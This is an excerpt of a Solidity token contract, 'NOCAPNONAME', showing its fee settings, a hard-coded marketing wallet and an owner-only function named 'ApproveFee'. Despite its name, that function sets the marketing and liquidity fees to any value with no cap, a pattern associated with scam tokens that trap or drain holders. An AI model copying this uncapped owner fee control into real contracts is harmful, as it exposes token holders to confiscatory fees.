...
contract NOCAPNONAME  is Context, IERC20, Ownable {
    ...
    string private constant _name = "NOCAPNONAME"; // 
    string private constant _symbol = "NCNN"; //    
    uint8 private constant _decimals = 9; // 
    uint256 private minoptions = 1 * 10**9;
    uint256 public _marketingFee = 9;
    uint256 public _liquidityFee = 2;
    address public  _marketingWallet = 0x851Cb313aaDf687AeB887a7ff14344eE8eb5767d;
    ...
    function ApproveFee(uint256 value) onlyOwner public{
        _marketingFee = value;
        _liquidityFee =value;
    }
